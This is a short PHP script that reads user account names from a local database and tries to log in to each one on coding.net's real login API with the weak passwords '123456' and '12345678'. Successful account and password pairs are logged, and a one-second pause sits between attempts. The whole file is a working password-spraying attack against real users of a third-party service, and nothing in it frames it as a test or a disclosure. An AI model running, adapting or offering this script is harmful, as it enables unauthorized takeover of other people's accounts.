<?php
date_default_timezone_set('Asia/Shanghai');

require_once 'vendor/rmccue/requests/library/Requests.php';
require_once 'core/log.php';
require_once 'core/config.php';
require_once 'core/db.php';

Requests::register_autoloader();

$apiUrl = 'https://coding.net/api/';
$loginUrl = $apiUrl . 'v2/account/login';

$count = Db::getInstance()->query('select count(*) as count from user');
$count = $count[0]['count'];
for ($i = 983; $i <= $count; $i++) {
    $user = Db::getInstance()->query('select global_key from user where id = ' . $i);
    $account = $user[0]['global_key'];
    $passwords = array(
        '123456',
        '12345678'
    );

    foreach ($passwords as $password) {
        $result = Requests::post($loginUrl, array(), array(
            'account' => $account,
            'password' => sha1($password),
            'remember_me' => false,
        ));

        if ($result->status_code == 200) {
            $body = json_decode($result->body, true);
            if ($body['code'] == 0) {
                // 请求成功
                Log::write(sprintf('account:%s, password:%s', $account, $password), 'login-success');
            } else {
                //Log::write(sprintf('account:%s, password:%s', $account, $password), 'login-fail');
            }
        } else {
            // 请求失败
            Log::write(sprintf('account:%s, password:%s', $account, $password), 'login-error');
        }

        sleep(1);
    }
}